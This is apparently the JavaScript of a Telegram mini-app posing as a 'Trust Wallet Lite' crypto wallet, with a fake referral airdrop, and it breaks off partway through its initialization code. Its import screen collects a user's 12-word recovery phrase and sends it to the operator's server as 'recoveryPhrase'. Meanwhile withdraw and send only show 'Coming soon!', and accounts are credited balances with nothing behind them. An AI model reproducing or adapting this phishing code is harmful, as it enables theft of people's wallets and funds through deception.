// ============================================================================
// TRUST WALLET LITE - ULTIMATE PROFESSIONAL VERSION 6.1 (FIXED)
// ============================================================================

// ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
let tg = null;
let REAL_USER_ID = null;
let TELEGRAM_USERNAME = '';
let TELEGRAM_FIRST_NAME = 'User';
let TELEGRAM_LAST_NAME = '';
let TELEGRAM_PHOTO = '';
let startParam = null;

try {
    tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
        console.log("✅ Telegram WebApp initialized");
        
        const telegramUser = tg.initDataUnsafe?.user;
        if (telegramUser && telegramUser.id) {
            REAL_USER_ID = telegramUser.id.toString();
            TELEGRAM_USERNAME = telegramUser.username || '';
            TELEGRAM_FIRST_NAME = telegramUser.first_name || 'User';
            TELEGRAM_LAST_NAME = telegramUser.last_name || '';
            TELEGRAM_PHOTO = telegramUser.photo_url || '';
            console.log("✅ Real Telegram ID loaded:", REAL_USER_ID);
        } else {
            console.log("⚠️ No Telegram user data available");
        }
        
        startParam = tg.initDataUnsafe?.start_param || null;
    } else {
        console.log("⚠️ Not in Telegram WebApp environment");
    }
} catch (error) {
    console.error("❌ Error initializing Telegram WebApp:", error);
}

// إذا لم نتمكن من الحصول على ID، نستخدم localStorage
if (!REAL_USER_ID) {
    const savedId = localStorage.getItem('twt_user_id');
    if (savedId) {
        REAL_USER_ID = savedId;
        console.log("📦 Using saved user ID from localStorage:", REAL_USER_ID);
    }
}

// قراءة startParam من URL إذا لم يكن موجوداً في tg
if (!startParam) {
    const urlParams = new URLSearchParams(window.location.search);
    startParam = urlParams.get('startapp') || urlParams.get('ref') || null;
}

console.log("📱 Final Telegram ID:", REAL_USER_ID);
console.log("👤 Username:", TELEGRAM_USERNAME);
console.log("📛 Name:", TELEGRAM_FIRST_NAME);

// ====== 2. إظهار شاشة التحميل وإخفائها بعد التهيئة ======
function hideSplashScreen() {
    const splash = document.getElementById('splashScreen');
    if (splash) {
        splash.classList.add('hidden');
        setTimeout(() => {
            splash.style.display = 'none';
        }, 500);
    }
}

function showErrorAndRetry(message) {
    const splash = document.getElementById('splashScreen');
    if (splash) {
        splash.innerHTML = `
            <div style="text-align: center; padding: 20px;">
                <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: #ff4444;"></i>
                <h2 style="color: #ff4444;">Error</h2>
                <p>${message}</p>
                <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #0088cc; border: none; border-radius: 10px; color: white;">Retry</button>
            </div>
        `;
    }
}

// ====== 3. STATE MANAGEMENT ======
let userData = null;
let isAdmin = false;
let adminId = null;
let currentLanguage = localStorage.getItem('language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';
let TWT_PRICE = 1.25;
let livePrices = {};
let unreadNotifications = 0;
let currentAdminTab = 'deposits';
let appInitialized = false;

// ====== 4. CONSTANTS ======
const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
const AIRDROP_BONUS = 10;
const REFERRAL_BONUS = 25;
const SWAP_FEE_PERCENT = 0.003;

const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'ADA', name: 'Cardano' },
    { symbol: 'DOGE', name: 'Dogecoin' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' },
    { symbol: 'TON', name: 'Toncoin' }
];

const AIRDROP_MILESTONES = [
    { invites: 5, reward: 25, unit: 'USDT', icon: 'fa-star' },
    { invites: 10, reward: 50, unit: 'USDT', icon: 'fa-medal' },
    { invites: 25, reward: 120, unit: 'USDT', icon: 'fa-medal' },
    { invites: 50, reward: 250, unit: 'USDT', icon: 'fa-crown' },
    { invites: 100, reward: 500, unit: 'USDT', icon: 'fa-crown' },
    { invites: 250, reward: 1000, unit: 'USDT', icon: 'fa-gem' },
    { invites: 500, reward: 2500, unit: 'USDT', icon: 'fa-gem' },
    { invites: 1000, reward: 5000, unit: 'USDT', icon: 'fa-diamond' }
];

const WITHDRAW_FEES = {
    TWT: 1, USDT: 0.16, BNB: 0.0005, BTC: 0.0002, ETH: 0.001,
    SOL: 0.005, TRX: 1, ADA: 0.5, DOGE: 1, SHIB: 50000, PEPE: 500000, TON: 0.1
};

const WITHDRAW_MINIMUMS = {
    TWT: 10, USDT: 10, BNB: 0.02, BTC: 0.0005, ETH: 0.005,
    SOL: 0.12, TRX: 40, ADA: 10, DOGE: 50, SHIB: 500000, PEPE: 5000000, TON: 1
};

const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    SHIB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png',
    PEPE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/24478.png',
    TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
};

const CRYPTO_IDS = {
    TWT: 'trust-wallet-token', USDT: 'tether', BNB: 'binancecoin',
    BTC: 'bitcoin', ETH: 'ethereum', SOL: 'solana', TRX: 'tron',
    ADA: 'cardano', DOGE: 'dogecoin', SHIB: 'shiba-inu',
    PEPE: 'pepe', TON: 'the-open-network'
};

const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫'];

// ====== 5. TRANSLATIONS (مختصرة لتوفير المساحة) ======
const translations = {
    en: {
        'nav.wallet': 'Wallet', 'nav.airdrop': 'Airdrop',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'Settings',
        'actions.deposit': 'Deposit', 'actions.withdraw': 'Withdraw',
        'actions.send': 'Send', 'actions.receive': 'Receive',
        'actions.swap': 'Swap', 'actions.history': 'History',
        'wallet.totalBalance': 'Total Balance',
        'airdrop.totalInvites': 'Total Invites', 'airdrop.earned': 'USDT Earned',
        'airdrop.yourLink': 'Your Invite Link', 'airdrop.milestones': 'Airdrop Milestones',
        'card.balance': 'Card Balance', 'settings.language': 'Language',
        'settings.theme': 'Theme', 'settings.logout': 'Logout',
        'admin.title': 'Admin Panel', 'admin.users': 'User Management',
        'admin.searchUser': 'Search User', 'admin.addBalance': 'Add Balance',
        'admin.removeBalance': 'Remove Balance', 'admin.refresh': 'Refresh',
        'error.insufficient': 'Insufficient balance', 'error.enterAmount': 'Enter valid amount',
        'success.swapCompleted': 'Swap completed', 'success.referralCopied': 'Referral link copied'
    },
    ar: {
        'nav.wallet': 'المحفظة', 'nav.airdrop': 'الإسقاط الجوي',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'الإعدادات',
        'actions.deposit': 'إيداع', 'actions.withdraw': 'سحب',
        'actions.send': 'إرسال', 'actions.receive': 'استلام',
        'actions.swap': 'تحويل', 'actions.history': 'السجل',
        'wallet.totalBalance': 'الرصيد الإجمالي',
        'airdrop.totalInvites': 'إجمالي الدعوات', 'airdrop.earned': 'USDT المكتسبة',
        'airdrop.yourLink': 'رابط الدعوة', 'airdrop.milestones': 'مراحل الإسقاط',
        'card.balance': 'رصيد البطاقة', 'settings.language': 'اللغة',
        'settings.theme': 'المظهر', 'settings.logout': 'تسجيل الخروج',
        'admin.title': 'لوحة المشرف', 'admin.users': 'إدارة المستخدمين',
        'admin.searchUser': 'بحث عن مستخدم', 'admin.addBalance': 'إضافة رصيد',
        'admin.removeBalance': 'خصم رصيد', 'admin.refresh': 'تحديث',
        'error.insufficient': 'رصيد غير كاف', 'error.enterAmount': 'أدخل مبلغ صحيح',
        'success.swapCompleted': 'تم التحويل', 'success.referralCopied': 'تم نسخ الرابط'
    }
};

function t(key) {
    return translations[currentLanguage]?.[key] || translations.en[key] || key;
}

function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
    return balance.toFixed(4) + ' ' + symbol;
}

function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    return num.toFixed(2);
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    if (!toast) return;
    const toastMessage = document.getElementById('toastMessage');
    if (toastMessage) toastMessage.textContent = message;
    toast.classList.remove('hidden');
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) modal.classList.remove('show');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied!');
}

// ====== 6. THEME & LANGUAGE ======
function toggleLanguage() {
    currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
    localStorage.setItem('language', currentLanguage);
    const flagEl = document.getElementById('currentLanguageFlag');
    if (flagEl) flagEl.textContent = currentLanguage === 'en' ? '🇬🇧' : '🇸🇦';
    if (currentLanguage === 'ar') {
        document.body.classList.add('rtl');
        document.documentElement.dir = 'rtl';
    } else {
        document.body.classList.remove('rtl');
        document.documentElement.dir = 'ltr';
    }
    if (currentPage === 'settings') renderSettings();
    if (currentPage === 'airdrop') renderAirdrop();
    if (currentPage === 'wallet') renderWallet();
    showToast('Language changed');
}

function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

function initTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
}

// ====== 7. API CALLS ======
async function apiCall(endpoint, method = 'GET', body = null) {
    const options = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) options.body = JSON.stringify(body);
    const response = await fetch(`/api${endpoint}`, options);
    return response.json();
}

async function loadAdminId() {
    try {
        const response = await fetch('/api/config');
        const config = await response.json();
        adminId = config.adminId;
        console.log("✅ Admin ID loaded:", adminId);
        if (REAL_USER_ID && adminId) {
            isAdmin = (REAL_USER_ID === adminId);
        }
        const crownBtn = document.getElementById('adminCrownBtn');
        if (crownBtn) {
            crownBtn.classList.toggle('hidden', !isAdmin);
        }
        return config;
    } catch (error) {
        console.error("Failed to load admin ID:", error);
        return null;
    }
}

async function createUser(userId, userData) {
    return apiCall('/users', 'POST', { userId, userData });
}

async function getUser(userId) {
    return apiCall(`/users/${userId}`);
}

async function updateUser(userId, updates) {
    return apiCall(`/users/${userId}`, 'PATCH', { updates });
}

async function processReferral(referrerId, newUserId) {
    return apiCall('/referrals', 'POST', { referrerId, newUserId });
}

async function createDepositAddress(userId, currency) {
    return apiCall('/deposit-address', 'POST', { userId, currency });
}

// ====== 8. PRICES ======
async function fetchLivePrices() {
    try {
        const ids = Object.values(CRYPTO_IDS).join(',');
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
        const data = await response.json();
        for (const [symbol, id] of Object.entries(CRYPTO_IDS)) {
            if (data[id]) {
                livePrices[symbol] = { price: data[id].usd, change: data[id].usd_24h_change || 0 };
            }
        }
        if (!livePrices.TWT) livePrices.TWT = { price: 1.25, change: 0 };
        TWT_PRICE = livePrices.TWT.price;
        if (currentPage === 'wallet') renderAssets();
        updateTotalBalance();
    } catch (error) {
        console.error("Price fetch error:", error);
    }
}

// ====== 9. USER DATA MANAGEMENT ======
function getUserId() {
    if (REAL_USER_ID) return REAL_USER_ID;
    return localStorage.getItem('twt_user_id') || null;
}

async function loadUserData() {
    try {
        const userId = getUserId();
        if (!userId) return false;
        
        const localData = localStorage.getItem(`user_${userId}`);
        if (localData) {
            userData = JSON.parse(localData);
            updateUI();
        }
        
        const result = await getUser(userId);
        if (result.success && result.data) {
            userData = result.data;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            updateUI();
            return true;
        }
        return false;
    } catch (error) {
        console.error("Error loading user data:", error);
        return false;
    }
}

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
        updateUser(userData.userId, userData);
    }
}

function updateTotalBalance() {
    if (!userData) return;
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * TWT_PRICE;
    const totalEl = document.getElementById('totalBalance');
    if (totalEl) totalEl.textContent = '$' + total.toFixed(2);
}

function updateUI() {
    if (currentPage === 'wallet') {
        renderAssets();
        updateTotalBalance();
    }
    if (currentPage === 'airdrop') renderAirdrop();
    if (currentPage === 'settings') renderSettings();
    updateUserDisplay();
}

function updateUserDisplay() {
    const userNameEl = document.getElementById('userName');
    const userIdEl = document.getElementById('userIdDisplay');
    const userAvatarEl = document.getElementById('userAvatar');
    
    if (userNameEl && userData) {
        userNameEl.textContent = userData.userName || TELEGRAM_FIRST_NAME;
    }
    if (userIdEl && userData) {
        userIdEl.textContent = `ID: ${userData.userId?.slice(-8)}`;
    }
    if (userAvatarEl && userData) {
        userAvatarEl.textContent = (userData.userName || TELEGRAM_FIRST_NAME).charAt(0).toUpperCase();
    }
}

function addNotification(message) {
    if (!userData) return;
    if (!userData.notifications) userData.notifications = [];
    userData.notifications.unshift({
        id: Date.now().toString(),
        message: message,
        read: false,
        timestamp: new Date().toISOString()
    });
    saveUserData();
    showToast(message);
}

// ====== 10. ONBOARDING & WALLET CREATION ======
function showMainApp() {
    const onboarding = document.getElementById('onboardingScreen');
    const mainContent = document.getElementById('mainContent');
    if (onboarding) onboarding.style.display = 'none';
    if (mainContent) mainContent.style.display = 'block';
    showWallet();
}

function showOnboarding() {
    const onboarding = document.getElementById('onboardingScreen');
    const mainContent = document.getElementById('mainContent');
    if (onboarding) onboarding.style.display = 'flex';
    if (mainContent) mainContent.style.display = 'none';
}

async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    if (!btn) return;
    
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        let newUserId = REAL_USER_ID;
        
        // إذا لم يكن هناك ID من تيليجرام، ننشئ ID مؤقت
        if (!newUserId) {
            newUserId = 'guest_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
            localStorage.setItem('twt_user_id', newUserId);
            console.log("📝 Created guest user ID:", newUserId);
        } else {
            localStorage.setItem('twt_user_id', newUserId);
        }
        
        // توليد عنوان إيداع
        let depositAddress = `0x${newUserId.slice(-40).padStart(40, '0')}`;
        try {
            const addressResult = await createDepositAddress(newUserId, 'USDT');
            if (addressResult.address) depositAddress = addressResult.address;
        } catch (e) {
            console.log("Using fallback address");
        }
        
        const newUserData = {
            userId: newUserId,
            userName: TELEGRAM_FIRST_NAME,
            username: TELEGRAM_USERNAME,
            telegramId: REAL_USER_ID || newUserId,
            depositAddress: depositAddress,
            balances: {
                TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
            },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now().toString(), message: '🎉 Welcome! +10 USDT', read: false, timestamp: new Date().toISOString() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        
        isAdmin = (newUserId === adminId);
        
        if (startParam && startParam !== newUserId) {
            await processReferral(startParam, newUserId);
        }
        
        showMainApp();
        updateUI();
        showToast('✅ Wallet created! +10 USDT');
    } catch (error) {
        console.error(error);
        showToast('Failed to create wallet', 'error');
    } finally {
        btn.innerHTML = 'Create a new wallet';
        btn.disabled = false;
    }
}

function showImportModal() {
    document.getElementById('importModal').classList.add('show');
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) { showToast(`Enter word ${i}`, 'error'); return; }
        words.push(word);
    }
    
    const btn = document.getElementById('confirmImportBtn');
    if (btn) {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
        btn.disabled = true;
    }
    
    try {
        let newUserId = REAL_USER_ID;
        if (!newUserId) {
            newUserId = 'imported_' + Date.now().toString(36);
            localStorage.setItem('twt_user_id', newUserId);
        } else {
            localStorage.setItem('twt_user_id', newUserId);
        }
        
        let depositAddress = `0x${newUserId.slice(-40).padStart(40, '0')}`;
        try {
            const addressResult = await createDepositAddress(newUserId, 'USDT');
            if (addressResult.address) depositAddress = addressResult.address;
        } catch (e) {}
        
        const newUserData = {
            userId: newUserId,
            userName: TELEGRAM_FIRST_NAME,
            username: TELEGRAM_USERNAME,
            recoveryPhrase: words.join(' '),
            depositAddress: depositAddress,
            balances: {
                TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
            },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now().toString(), message: '🎉 Wallet imported! +10 USDT', read: false, timestamp: new Date().toISOString() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        
        isAdmin = (newUserId === adminId);
        
        if (startParam && startParam !== newUserId) {
            await processReferral(startParam, newUserId);
        }
        
        closeModal('importModal');
        showMainApp();
        updateUI();
        showToast('✅ Wallet imported! +10 USDT');
    } catch (error) {
        console.error(error);
        showToast('Failed to import wallet', 'error');
    } finally {
        if (btn) {
            btn.innerHTML = 'Import Wallet';
            btn.disabled = false;
        }
    }
}

// ====== 11. RENDER FUNCTIONS ======
function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        const changeClass = change >= 0 ? 'positive' : 'negative';
        const changeSymbol = change >= 0 ? '+' : '';
        
        return `
            <div class="asset-item">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img">
                    <div class="asset-info">
                        <h4>${asset.name}</h4>
                        <p>${asset.symbol} <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span></p>
                    </div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${formatNumber(value)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$0</div>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>${t('actions.deposit')}</span></button>
            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>${t('actions.withdraw')}</span></button>
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button>
            <button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button>
        </div>
        <div id="assetsList" class="assets-list"></div>
    `;
    renderAssets();
    updateTotalBalance();
}

function renderAirdrop() {
    const container = document.getElementById('referralContainer');
    if (!container || !userData) return;
    
    const inviteLink = `${BOT_LINK}?startapp=${userData.userId}`;
    
    container.innerHTML = `
        <div class="referral-stats">
            <div class="stat-card"><span>${t('airdrop.totalInvites')}</span><span>${userData.inviteCount || 0}</span></div>
            <div class="stat-card"><span>${t('airdrop.earned')}</span><span>${(userData.totalUsdtEarned || 0).toFixed(2)}</span></div>
        </div>
        <div class="referral-link-card">
            <div class="link-label">${t('airdrop.yourLink')}</div>
            <div class="link-container">
                <input type="text" id="inviteLink" value="${inviteLink}" readonly>
                <button class="copy-btn" onclick="copyInviteLink()"><i class="fas fa-copy"></i></button>
            </div>
        </div>
        <div class="section-header"><h3>${t('airdrop.milestones')}</h3></div>
        <div id="milestonesList" class="milestones-list"></div>
    `;
    
    renderAirdropMilestones();
}

function renderAirdropMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container || !userData) return;
    
    container.innerHTML = AIRDROP_MILESTONES.map(m => {
        const progress = Math.min((userData.inviteCount / m.invites) * 100, 100);
        const canClaim = userData.inviteCount >= m.invites && !userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
        const isClaimed = userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
        
        return `
            <div class="milestone-item">
                <div class="milestone-header"><span><i class="fas ${m.icon}"></i> ${m.invites} Invites</span><span>${m.reward} ${m.unit}</span></div>
                <div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div>
                <div class="progress-text">${userData.inviteCount}/${m.invites}</div>
                ${canClaim ? `<button class="claim-btn" onclick="claimMilestone(${m.invites})">Claim Reward</button>` : isClaimed ? '<p style="color:var(--success);text-align:center;">✓ Claimed</p>' : ''}
            </div>
        `;
    }).join('');
}

async function claimMilestone(invites) {
    const m = userData.airdropMilestones.find(x => x.invites === invites);
    if (!m || m.claimed) return;
    if (userData.inviteCount < invites) {
        showToast(`Need ${invites} invites`, 'error');
        return;
    }
    const reward = AIRDROP_MILESTONES.find(x => x.invites === invites).reward;
    userData.balances.USDT = (userData.balances.USDT || 0) + reward;
    userData.totalUsdtEarned = (userData.totalUsdtEarned || 0) + reward;
    m.claimed = true;
    saveUserData();
    renderAirdrop();
    renderWallet();
    updateTotalBalance();
    showToast(`Claimed ${reward} USDT!`);
}

function copyInviteLink() {
    copyToClipboard(`${BOT_LINK}?startapp=${userData?.userId}`);
    showToast(t('success.referralCopied'));
}

function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    const twtBalance = userData?.balances?.TWT || 0;
    const cardNumber = userData?.userId?.slice(-4) || '8888';
    container.innerHTML = `
        <div class="virtual-card">
            <div class="card-chip"><i class="fas fa-microchip"></i></div>
            <div class="card-brand">TWT Pay</div>
            <div class="card-number"><span>****</span><span>****</span><span>****</span><span>${cardNumber}</span></div>
            <div class="card-details"><div><div class="label">Card Holder</div><div class="value">${userData?.userName || 'User'}</div></div><div><div class="label">Expires</div><div class="value">12/28</div></div></div>
            <div class="card-balance"><div class="balance-label">${t('card.balance')}</div><div class="balance-value">${twtBalance} TWT</div><div class="balance-usd">≈ $${(twtBalance * TWT_PRICE).toFixed(2)}</div></div>
            <div class="card-footer"><i class="fab fa-visa"></i><span>Virtual Card</span></div>
        </div>
        <div class="card-actions">
            <button class="card-action-btn" onclick="showTopUp()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button>
            <button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button>
            <button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button>
        </div>
        <div class="card-features">
            <div class="feature"><i class="fas fa-globe"></i><span>Global</span></div>
            <div class="feature"><i class="fas fa-shield-alt"></i><span>Secure</span></div>
            <div class="feature"><i class="fas fa-percent"></i><span>2% Cashback</span></div>
        </div>
    `;
}

function showTopUp() { showToast('Coming soon!'); }
function showCardSettings() { showToast('Coming soon!'); }
function showCardTransactions() { showHistory(); }

function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="showNotifications()"><i class="fas fa-bell"></i><div><div class="label">Notifications</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="showHistory()"><i class="fas fa-history"></i><div><div class="label">${t('actions.history')}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleLanguage()"><i class="fas fa-language"></i><div><div class="label">${t('settings.language')}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleTheme()"><i class="fas fa-moon"></i><div><div class="label">${t('settings.theme')}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">${t('settings.logout')}</div></div></div>
        </div>
    `;
}

function showHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    if (!modal || !list) return;
    const txs = userData?.transactions || [];
    if (txs.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:40px;">📭 No transactions</div>';
    } else {
        list.innerHTML = txs.map(tx => `
            <div class="history-item">
                <div><span>${tx.type}</span> <span>${tx.amount} ${tx.currency}</span></div>
                <div style="font-size:10px;">${new Date(tx.timestamp).toLocaleString()}</div>
            </div>
        `).join('');
    }
    modal.classList.add('show');
}

function showNotifications() {
    const modal = document.getElementById('notificationsModal');
    const list = document.getElementById('notificationsList');
    if (!modal || !list || !userData) return;
    const notifications = userData.notifications || [];
    if (notifications.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:40px;">📭 No notifications</div>';
    } else {
        list.innerHTML = notifications.map(n => `
            <div class="notification-item">
                <div>${n.message}</div>
                <div style="font-size:10px;">${new Date(n.timestamp).toLocaleString()}</div>
            </div>
        `).join('');
    }
    modal.classList.add('show');
}

function logout() {
    if (confirm('Logout?')) {
        localStorage.clear();
        location.reload();
    }
}

function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function showReceiveModal() { document.getElementById('receiveModal').classList.add('show'); }
function showDepositModal() { document.getElementById('depositModal').classList.add('show'); }
function showWithdrawModal() { document.getElementById('withdrawModal').classList.add('show'); }
function showSwapModal() { showToast('Coming soon!'); }

function sendTransaction() { showToast('Coming soon!'); }
function submitWithdraw() { showToast('Coming soon!'); }

// ====== 12. NAVIGATION ======
function showWallet() { 
    currentPage = 'wallet'; 
    document.getElementById('walletSection').classList.remove('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const walletNav = document.querySelector('.nav-item[data-tab="wallet"]');
    if (walletNav) walletNav.classList.add('active');
    
    renderWallet();
}

function showAirdrop() { 
    currentPage = 'airdrop'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('referralSection').classList.remove('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const airdropNav = document.querySelector('.nav-item[data-tab="referral"]');
    if (airdropNav) airdropNav.classList.add('active');
    
    renderAirdrop();
}

function showTWTPay() { 
    currentPage = 'twtpay'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.remove('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const twtpayNav = document.querySelector('.nav-item[data-tab="twtpay"]');
    if (twtpayNav) twtpayNav.classList.add('active');
    
    renderTWTPay();
}

function showSettings() { 
    currentPage = 'settings'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.remove('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const settingsNav = document.querySelector('.nav-item[data-tab="settings"]');
    if (settingsNav) settingsNav.classList.add('active');
    
    renderSettings();
}

// ====== 13. ADMIN PANEL (مبسطة) ======
function showAdminPanel() {
    if (!isAdmin) { showToast('Access denied', 'error'); return; }
    alert('Admin Panel - Coming Soon');
}

// ====== 14. INITIALIZATION ======
document.addEventListener('DOMContentLoaded', async () => {
    console.log("🚀 Initializing Trust Wallet Lite v6.1...");
    
    initTheme();
    
    // تأكد من وجود العناصر الأساسية
    const splash = document.getElementById('splashScreen');
    if (!splash) {
